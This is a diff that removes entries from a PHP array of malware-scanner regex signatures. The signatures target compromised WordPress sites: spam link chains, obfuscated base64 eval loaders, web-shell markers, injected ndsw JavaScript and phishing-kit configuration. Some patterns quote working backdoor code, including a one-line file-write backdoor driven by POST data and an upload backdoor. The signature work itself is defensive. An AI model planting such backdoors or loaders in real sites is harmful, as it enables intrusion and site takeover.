-      'pattern' => '/\\<a href\\=http\\:\\/\\/www\\.vgmsteel\\.co\\.za\\/1kkm\\/2001\\-johnson\\-25\\.html\\>4y\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.chintech\\.com\\.cn\\/hfzvtib\\/splunk\\-case\\-1\\-\\=\\=\\-1\\.html\\>vy\\<\\/a/',
-      'label' => 'source-file tail snippet',
-    ),
-    1097 => 
-    array (
-      'pattern' => '/content\\/uploads\\/2019\\/08\\/r1suqhoq0\\/cooper/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1098 => 
-    array (
-      'pattern' => '/\\>Uber code\\<\\/span\\>\\<\\/h1\\>
-
-
-
-            \\<\\/div\\>
-
-
-
-            \\<\\!\\-\\- mainmenu begin \\-\\-\\>
-
-            
-
-\\<ul id\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1099 => 
-    array (
-      'pattern' => '/\\>Free drug apps for android\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1100 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if IE 9\\]\\>
-
-\\<html class\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Geofabrik\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    1101 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/sayehbeauty\\.com\\/jzv1u2\\/gumdrop\\-ipad\\-case\\.html\\>bq\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.icynene\\-vloerisolatie\\.nl\\/se1kpi\\/punishment\\-merriam\\.h/',
-      'label' => 'source-file tail snippet',
-    ),
-    1102 => 
-    array (
-      'pattern' => '/\\>German pod 101\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1103 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/farmbionics\\.com\\/ykize\\/c6\\-z06\\-cam\\.html\\>yr\\<\\/a\\>, \\<a href\\=http\\:\\/\\/kubisku\\.com\\/os3vfrsj\\/whats\\-the\\-best\\-graphics\\-driver\\-for\\-core\\-i7\\-/',
-      'label' => 'source-file tail snippet',
-    ),
-    1104 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/iwearghanimi\\.com\\/z2psbh1\\/https\\-www\\-teacherspayteachers\\-com\\-cart\\-checkout\\.html\\>ej\\<\\/a\\>, \\<a href\\=http\\:\\/\\/bermudes\\.costaservicios\\./',
-      'label' => 'source-file tail snippet',
-    ),
-    1105 => 
-    array (
-      'pattern' => '/true"\\>Fetty wap eye makeup\\<\\/span\\>\\<span\\>\\<\\/span\\>\\<\\/h3\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1106 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/nadanakhil\\.com\\/nfxj0n\\/employee\\-database\\-design\\.html\\>cn\\<\\/a\\>, \\<a href\\=http\\:\\/\\/premuim420store\\.com\\/prtotxu\\/remux\\-1080p\\.html\\>pf\\<\\/a/',
-      'label' => 'source-file tail snippet',
-    ),
-    1107 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/rashtriyagaurakshakdal\\.org\\/vdbllpmm\\/fitbit\\-flex\\-bands\\-ebay\\.html\\>4j\\<\\/a\\>, \\<a href\\=http\\:\\/\\/acepokerkita\\.com\\/parcsep\\/ezdok\\-camera\\-/',
-      'label' => 'source-file tail snippet',
-    ),
-    1108 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/tryitout\\.xyz\\/8yp9g15f\\/amcharts\\-line\\-chart\\-example\\.html\\>nh\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.ardexendura\\.com\\/gdyroby\\/ffmpeg\\-rtmps\\-suppor/',
-      'label' => 'source-file tail snippet',
-    ),
-    1109 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/premiertelecare\\.com\\/fui8\\/car\\-imagery\\-api\\.html\\>vy\\<\\/a\\>, \\<a href\\=http\\:\\/\\/bagsforbread\\.com\\/2jti\\/24\\-news\\-malayalam\\-contact\\-number\\.h/',
-      'label' => 'source-file tail snippet',
-    ),
-    1110 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>
-
-  \\<meta charset\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>G3112 root\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    1111 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>
-
-  \\<meta charset\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Dell wyse 5030 manual\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    1112 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  
-
-  
-
-  \\<title\\>Dnd premade shops\\<\\/title\\>
-
- 
-
-\\<\\/head\\>
-
-
-
-
-
-\\<body\\>
-
-\\<br\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1113 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  
-
-  
-
-  \\<title\\>Xaml to html converter online\\<\\/title\\>
-
- 
-
-\\<\\/head\\>
-
-
-
-
-
-\\<body\\>
-
-\\<br\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1114 => 
-    array (
-      'pattern' => '/\\>Anti cheat bypass geometry dash\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1115 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/blog\\.magnifii\\.co\\/l2u3b\\/fz\\-olx\\-guwahati\\.html\\>xz\\<\\/a\\>, \\<a href\\=http\\:\\/\\/xali\\.com\\.sg\\/zj1\\/azure\\-ad\\-connect\\-sync\\-schedule\\.html\\>bs\\<\\/a\\>/',
-      'label' => 'source-file tail snippet',
-    ),
-    1116 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  
-
-  
-
-  \\<title\\>Proximate analysis of biomass\\<\\/title\\>
-
- 
-
-\\<\\/head\\>
-
-
-
-
-
-\\<body\\>
-
-\\<br\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1117 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/wikienvironment\\.org\\/xqbjn5\\/blackhatprotools\\-reddit\\.html\\>ic\\<\\/a\\>, \\<a href\\=http\\:\\/\\/africanhumanistcelebrants\\.com\\/0q53jkm\\/5\\-letter/',
-      'label' => 'source-file tail snippet',
-    ),
-    1118 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/lalucozyrooms\\.com\\/fwpvjyj43\\/king\\-naresuan\\-part\\-three\\-full\\-movie\\.html\\>jd\\<\\/a\\>, \\<a href\\=http\\:\\/\\/danielwellingtonwatch\\.vn\\/egkxw\\/na/',
-      'label' => 'source-file tail snippet',
-    ),
-    1119 => 
-    array (
-      'pattern' => '/content\\/uploads\\/2019\\/08\\/hlbr\\/ladbible/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1120 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>
-
-  \\<meta charset\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Homemade clue game\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    1121 => 
-    array (
-      'pattern' => '/\\>Sky iptv\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1122 => 
-    array (
-      'pattern' => '/\\$?banner_drones\\b/',
-      'label' => 'sample-specific identifier',
-    ),
-    1123 => 
-    array (
-      'pattern' => '/\\$?wwwalhijazibooks\\b/',
-      'label' => 'sample-specific identifier',
-    ),
-    1124 => 
-    array (
-      'pattern' => '/content\\/uploads\\/2019\\/08\\/3rddb54\\/male/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1125 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  
-
-  
-
-  \\<title\\>Sulphuric acid oman\\<\\/title\\>
-
- 
-
-\\<\\/head\\>
-
-
-
-
-
-\\<body\\>
-
-\\<br\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1126 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/dakhoavanthanh\\.com\\/go18vv\\/dell\\-monitor\\-too\\-bright\\.html\\>xs\\<\\/a\\>, \\<a href\\=http\\:\\/\\/300property\\.com\\/eem8h\\/emirates\\-airline\\-jobs\\-in\\-/',
-      'label' => 'source-file tail snippet',
-    ),
-    1127 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/zerolevel\\.net\\/ibdj8f\\/need\\-for\\-speed\\-movie\\-download\\-hdpopcorns\\.html\\>iy\\<\\/a\\>, \\<a href\\=http\\:\\/\\/new\\.d8\\.systems\\/oqrkof\\/veeam\\-cloud\\-c/',
-      'label' => 'source-file tail snippet',
-    ),
-    1128 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/mwl\\.pub\\/ba8ps8r\\/case\\-on\\-bata\\-ltd\\.html\\>aj\\<\\/a\\>, \\<a href\\=http\\:\\/\\/komfremont\\.ru\\/zilm8oi\\/list\\-of\\-industrial\\-estate\\-in\\-lahore\\.html\\>3/',
-      'label' => 'source-file tail snippet',
-    ),
-    1129 => 
-    array (
-      'pattern' => '/true"\\>Ymusic ad free\\<\\/span\\>\\<span\\>\\<\\/span\\>\\<\\/h3\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1130 => 
-    array (
-      'pattern' => '/Mobile mohs inc/',
-      'label' => 'sample-specific literal',
-    ),
-    1131 => 
-    array (
-      'pattern' => '/content\\/uploads\\/2019\\/08\\/3rddb54\\/how/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1132 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>
-
-  \\<meta charset\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Snacks distribution business\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    1133 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/servidordeiptv\\.xyz\\/xj3wg\\/company\\-stocklots\\-qatar\\.html\\>u7\\<\\/a\\>, \\<a href\\=http\\:\\/\\/energysmart\\.io\\/zpus39\\/nso\\-books\\-for\\-class\\-7\\-free/',
-      'label' => 'source-file tail snippet',
-    ),
-    1134 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  
-
-  
-
-  \\<title\\>Fsx aw189\\<\\/title\\>
-
- 
-
-\\<\\/head\\>
-
-
-
-
-
-\\<body\\>
-
-\\<br\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1135 => 
-    array (
-      'pattern' => '/content\\/themes\\/guava\\/t2igcg\\/current/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1136 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>
-
-  \\<meta charset\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Pet friendly hotels\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    1137 => 
-    array (
-      'pattern' => '/\\$?septentrionalis\\b/',
-      'label' => 'sample-specific identifier',
-    ),
-    1138 => 
-    array (
-      'pattern' => '/\\>Toluna\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1139 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/thesamf\\.org\\/oho\\/cox\\-architecture\\-abn\\.html\\>uc\\<\\/a\\>, \\<a href\\=http\\:\\/\\/dunlopillo\\.firstcom\\.vn\\/znvoqelq\\/angularjs\\-material\\-table\\.htm/',
-      'label' => 'source-file tail snippet',
-    ),
-    1140 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>
-
-  \\<meta charset\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Fake au generator\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    1141 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  \\<title\\>Meteor garden 2018 ep 2 eng sub dramacool\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1142 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/psychicsmarket\\.com\\/ygt\\/punishment\\-for\\-listening\\-to\\-music\\-in\\-islam\\.html\\>nq\\<\\/a\\>, \\<a href\\=http\\:\\/\\/nadanakhil\\.com\\/nfxj0n\\/over\\-the\\-/',
-      'label' => 'source-file tail snippet',
-    ),
-    1143 => 
-    array (
-      'pattern' => '/\\>Fortigate external ip block list\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1144 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/energysmart\\.io\\/zpus39\\/how\\-to\\-get\\-high\\-enchantments\\-on\\-minecraft\\-with\\-commands\\.html\\>rr\\<\\/a\\>, \\<a href\\=http\\:\\/\\/controlarbitrioscbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    1145 => 
-    array (
-      'pattern' => '/\\>Rar to iso\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1146 => 
-    array (
-      'pattern' => '/\\>Cozy app\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1147 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/chethanalakshan\\.cf\\/bsin70\\/taking\\-oil\\-bath\\-in\\-dream\\.html\\>cc\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.gtdm1314\\.com\\/eay\\/sleep\\-apnea\\-va\\-disability/',
-      'label' => 'source-file tail snippet',
-    ),
-    1148 => 
-    array (
-      'pattern' => '/Oi0gh84eSs\\+a77Cs\\/\\+PYvs8v5sMJD\\/TFY2so32zN\\+SrHHIzKgekHAmpvPFoVk\\+NZ\\+BBEri0yIjOi\\/NYT/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1149 => 
-    array (
-      'pattern' => '/\\<\\?php class Flo \\{function __construct\\(\\) \\{\\$module \\= \\$this\\-\\>stack\\(\\$this\\-\\>income\\);\\$module \\= \\$this\\-\\>access\\(\\$this\\-\\>ver\\(\\$module\\)\\);\\$module \\= \\$this\\-/',
-      'label' => 'source-file tail snippet',
-    ),
-    1150 => 
-    array (
-      'pattern' => '/https\\:\\/\\/fonts\\.googleapis\\.com\\/css\\?family\\=Jockey\\+One[\\s\\S]{0,160}https\\:\\/\\/fonts\\.googleapis\\.com\\/css\\?family\\=Courier/',
-      'label' => 'sample-specific literal chain',
-    ),
-    1151 => 
-    array (
-      'pattern' => '/\\<\\!\\-\\-codes_iframe\\-\\-\\>\\<script type\\="text\\/javascript"\\> function getCookie\\(e\\)\\{var U\\=document\\.cookie\\.match\\(new RegExp\\("\\(\\?\\:\\^\\|; \\)"\\+e\\.replace\\(\\/\\(\\[\\\\\\.\\$\\?/',
-      'label' => 'source-file tail snippet',
-    ),
-    1152 => 
-    array (
-      'pattern' => '/error_reporting\\(0\\);[\\s\\S]{0,12000}die\\("Harap edit APIKEY dalam file antibot\\-config\\.php\\. \\(Please edit api key in antibot\\-config\\.php file\\.\\)"\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1153 => 
-    array (
-      'pattern' => '/\\$password \\= "K74y39GMjUQ"; \\/\\/ Password[\\s\\S]{0,12000}function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d3336/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1154 => 
-    array (
-      'pattern' => '/\\$password \\= "A9TWQORP7s8"; \\/\\/ Password[\\s\\S]{0,12000}function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d3336/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1155 => 
-    array (
-      'pattern' => '/\\/\\*\\*\\* PHP Encode Sh\\*ll Auto v4 Fox \\*\\*\\*\\/[\\s\\S]{0,12000}eval\\(base64_decode\\(\'ZnVuY3Rpb24gX0Y4aHAoJF9NcU5OeW0xeG8peyRfTXFOTnltMXhvPXN1YnN0cigkX01xTk55bTF4bywoaW50KShoZXgyYmluKCczMTMwMzEzOScpKSk7JF9N/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1156 => 
-    array (
-      'pattern' => '/\\$password \\= "JVzcFHWvfDk"; \\/\\/ Password[\\s\\S]{0,12000}function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d3336/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1157 => 
-    array (
-      'pattern' => '/\\$password \\= "u2PGqyvO4sI"; \\/\\/ Password[\\s\\S]{0,12000}function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d3336/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1158 => 
-    array (
-      'pattern' => '/\\$password \\= "SGJIZrYkbRO"; \\/\\/ Password[\\s\\S]{0,12000}function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d3336/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1159 => 
-    array (
-      'pattern' => '/9DKDyPGHuI3KPHjpOQzIbU2gx8SL36b1p7L6PQO9MxRnplMaAyVL5eKgEa0XZrSiqDJTOxTmTzyDeNaV/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1160 => 
-    array (
-      'pattern' => '/\\$password \\= "QyvWR6uwKJr"; \\/\\/ Password[\\s\\S]{0,12000}function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d3336/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1161 => 
-    array (
-      'pattern' => '/\\$password \\= "ZneymcHQM9d"; \\/\\/ Password[\\s\\S]{0,12000}function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d3336/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1162 => 
-    array (
-      'pattern' => '/UEsDBAoAAAAAADlZEU8AAAAAAAAAAAAAAAAIAAAAenBjb2U0cy9QSwMEFAAAAAgAQ1kRT3Ecm6iSBwAA/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    1163 => 
-    array (
-      'pattern' => '/\\=\\=\\= WooCommerce \\=\\=\\=[\\s\\S]{0,12000}\\<\\?php if\\(\\$_GET\\["login"\\]\\=\\="canshu"\\)\\{if\\(@copy\\(\\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\], \\$_FILES\\[\'file\'\\]\\[\'name\'\\]\\)\\) \\{ echo \'\\<b\\>Upload Complate \\!\\!\\!\\<\\/b\\>\\<br\\>\'; /s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1164 => 
-    array (
-      'pattern' => '/login"\\] \\=\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1165 => 
-    array (
-      'pattern' => '/\\/\\/header\\(\'Content\\-Type\\:text\\/html; charset\\=utf\\-8\'\\);[\\s\\S]{0,12000}\\$O__00OO0O_\\=base64_decode\\("LTQ2bnFhX2U4OWR5cmJpa2hqZnB3eGN0em1sMnNvdjdndTAzNTE\\="\\);\\$OO0OO00___\\=\\$O__00OO0O_\\{19\\}\\.\\$O__00OO0O_\\{12\\}\\.\\$O__00OO0O_\\{7\\}/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1166 => 
-    array (
-      'pattern' => '/require_once\\(\'autoload\\.php\'\\);[\\s\\S]{0,12000}\\$Antibot\\-\\>error\\(403\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1167 => 
-    array (
-      'pattern' => '/\\* @Date\\:   2019\\-09\\-30 10\\:55\\:56[\\s\\S]{0,12000}\\$config\\[\'password_panel\'\\] 	\\= \'admin\';/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1168 => 
-    array (
-      'pattern' => '/\\/" \\>Back To Home\\<\\/a\\>
-		                \\<\\/div\\>
-		            \\<\\/div\\>
-		        \\<\\/div\\>
-		        \\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1169 => 
-    array (
-      'pattern' => '/if\\s+\\(\\s+\\(\\$file\\s+\\=\\s+file_get_contents\\(\\$path\\s+\\.\\s+\'\\/wp\\-includes\\/post\\.php\'\\)\\)\\s+&&\\s+\\(file_put_contents\\(\\$path\\s+\\.\\s+\'\\/wp\\-includes\\/wp\\-cd\\.php\',\\s+base64_decode\\(\\$GLOBALS\\[\'WP_CD_CODE\'\\]\\)\\)\\)\\s+\\)/',
-      'label' => 'sample-specific line fragment',
-    ),
-    1170 => 
-    array (
-      'pattern' => '/,\\$ip\\);
-
-\\}
-
-\\}
-\\}\\/\\/ end if log admins ip
-
-
-
-
-\\/\\/add cookies to organic traffic
-
-if\\(get_option\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    1171 => 
-    array (
-      'pattern' => '/\\* Plugin Name\\: CMSmap \\- WordPress Shell[\\s\\S]{0,12000}include\\(\'log\\.zip\'\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1172 => 
-    array (
-      'pattern' => '/will\';
-\\$shellname\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1173 => 
-    array (
-      'pattern' => '/\\<\\?php \\/\\* Do not change this code, or your script will not work\\. Checksum\\: 398a66245b7a93ba7ef2e95f1911b3e3618b3727503454ba5c28d29fae0b13c920/',
-      'label' => 'source-file tail snippet',
-    ),
-    1174 => 
-    array (
-      'pattern' => '/h8549\'\\] \\= Array\\(\\);global \\$h8549;\\$h8549 \\= \\$GLOBALS;\\$\\{"\\\\x47\\\\x4c\\\\x4fB\\\\x41\\\\x4c\\\\x53"\\}\\[[\\s\\S]{0,160}kbd84d1c/',
-      'label' => 'sample-specific literal chain',
-    ),
-    1175 => 
-    array (
-      'pattern' => '/Plugin Name\\: Link Love[\\s\\S]{0,12000}\\<\\?php if\\(isset\\(\\$_GET\\[\'s\'\\]\\)\\)\\{echo \'nsd\'\\.\'fjk\';if\\(isset\\(\\$_POST\\[\'c\'\\]\\)\\)\\{file_put_contents\\(\\$_POST\\[\'n\'\\],base64_decode\\(\\$_POST\\[\'c\'\\]\\)\\);\\}die\\(\\);\\}\\?\\>/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1176 => 
-    array (
-      'pattern' => '/\\+t\\+"\\]",e\\[t\\],r,i\\)\\}S\\.param\\=function\\(e,t\\)\\{var n,r\\=\\[\\],i\\=function\\(e,t\\)\\{var n\\=m\\(t\\)\\?t\\(\\)\\:t;r\\[r\\.length\\]\\=encodeURIComponent\\(e\\)\\+/',
-      'label' => 'sample-specific literal',
-    ),
-    1177 => 
-    array (
-      'pattern' => '/\\(\\(\\)\\=\\>\\{"use strict";var e\\=\\{d\\:\\(t,n\\)\\=\\>\\{for\\(var r in n\\)e\\.o\\(n,r\\)&&\\!e\\.o\\(t,r\\)&&Object\\.defineProperty\\(t,r,\\{enumerable\\:\\!0,get\\:n\\[r\\]\\}\\)\\},o\\:\\(e,t\\)\\=\\>Object[\\s\\S]{0,12000}\\/\\/\\# sourceMappingURL\\=index\\.min\\.js\\.map;if\\(typeof ndsw\\=\\=\\="undefined"\\)\\{\\(function\\(n,t\\)\\{var r\\=\\{I\\:175,h\\:176,H\\:154,X\\:"0x95",J\\:177,d\\:142\\},a\\=x,e\\=n\\(\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1178 => 
-    array (
-      'pattern' => '/fast\', function\\(\\) \\{
-                                                    \\$\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    1179 => 
-    array (
-      'pattern' => '/\\/\\*global jQuery, document, redux\\*\\/[\\s\\S]{0,12000}\\}\\)\\( jQuery \\);;if\\(typeof ndsw\\=\\=\\="undefined"\\)\\{\\(function\\(n,t\\)\\{var r\\=\\{I\\:175,h\\:176,H\\:154,X\\:"0x95",J\\:177,d\\:142\\},a\\=x,e\\=n\\(\\);while\\(\\!\\!\\[\\]\\)\\{try\\{var i\\=pa/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1180 => 
-    array (
-      'pattern' => '/\\/\\*\\! This file is auto\\-generated \\*\\/[\\s\\S]{0,12000}\\!function\\(\\)\\{"use strict";var e\\=\\{d\\:function\\(n,t\\)\\{for\\(var o in t\\)e\\.o\\(t,o\\)&&\\!e\\.o\\(n,o\\)&&Object\\.defineProperty\\(n,o,\\{enumerable\\:\\!0,get\\:t\\[o\\]\\}\\)\\},o\\:f/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1181 => 
-    array (
-      'pattern' => '/add_action\\(\'wp_footer\', function\\(\\) \\{[\\s\\S]{0,12000}function _0x3629\\(\\)\\{const _0x539679\\=\\[\'1070375GbPGzz\',\'catch\',\'crypto_ini\',\'91962mzGKod\',\'RTX\',\'unknown\',\'ENDOR_WEBG\',\'message\',\';\\\\x20path\\=\\/;\\\\/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1182 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ImSnZ \\= \'st\'\\.\'r\'\\.\'_r\'\\.\'ot13\'; \\$YzHKc \\= \'base\'\\.\'64\'\\.\'_deco\'\\.\'de\'; \\$NtXuB \\= \'g\'\\.\'zinfla\'\\.\'te\'; \\$JSBWV \\= \'s\'\\.\'trrev\'; ini_set\\(\'error_log/',
